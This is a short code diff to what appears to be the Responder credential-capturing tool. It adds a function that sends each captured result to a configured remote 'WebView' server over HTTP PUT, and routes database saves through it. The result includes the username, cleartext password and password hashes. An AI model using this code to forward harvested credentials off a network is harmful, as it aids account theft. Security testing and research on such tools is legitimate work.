@@ -22,6 +22,8 @@ import socket
 import time
 import settings
 import datetime
+import requests
+import json
 
 def RandomChallenge():
     if settings.Config.NumChal == "random":
@@ -155,9 +157,27 @@ def CreateResponderDb():
 		cursor.commit()
 		cursor.close()
 
+def sendtoWebView(result):
+	if settings.Config.WebViewSSLAuth_On_Off:
+		print color("[!] Error: WebView with SSL auth not yet implemented!")
+		return
+
+		#settings.Config.WebViewSSLServerCert
+		#settings.Config.WebViewSSLClientCert
+		#settings.Config.WebViewSSLClientKey
+	
+	else:
+		result['agent_id'] = settings.Config.WebViewAgentId
+		payload = [result]
+		headers = {'content-type': 'application/json'}
+		response = requests.put(settings.Config.WebViewURL, data=json.dumps(payload), headers=headers)
+		return
+
+		
+
 def SaveToDb(result):
-	if settings.webview is not None:
-		settings.webview.savetodb(result)
+	if settings.Config.WebView_On_Off:
+		sendtoWebView(result)
 
 	for k in [ 'module', 'type', 'client', 'hostname', 'user', 'cleartext', 'hash', 'fullhash' ]:
 		if not k in result:
